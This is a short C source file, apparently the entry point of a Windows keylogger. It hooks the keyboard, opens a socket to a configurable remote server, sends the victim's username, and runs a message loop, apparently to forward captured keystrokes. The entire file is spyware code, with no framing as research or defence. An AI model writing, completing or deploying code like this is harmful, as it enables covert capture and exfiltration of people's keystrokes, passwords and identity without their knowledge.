#include "include.h"

int main(void) {

	char SERVER_IP[IP_LEN] = "127.0.0.1";
	u_short SERVER_PORT = 8080;

	if (!get_server_config(SERVER_IP, &SERVER_PORT)) {
		return EXIT_FAILURE;
	}

	_setmode(_fileno(stdout), _O_U8TEXT);
	_setmode(_fileno(stderr), _O_U8TEXT);

	HHOOK hook = hook_the_keyboard();
	if (!hook) {
		return EXIT_FAILURE;
	}

	sock = connect_to_server(SERVER_IP, SERVER_PORT);
	if (sock == INVALID_SOCKET) {
		return EXIT_FAILURE;
	}

	send_username_to_server(sock);

	run_message_loop();
	UnhookWindowsHookEx(hook);
	closesocket(sock);
	WSACleanup();
	return EXIT_SUCCESS;
}
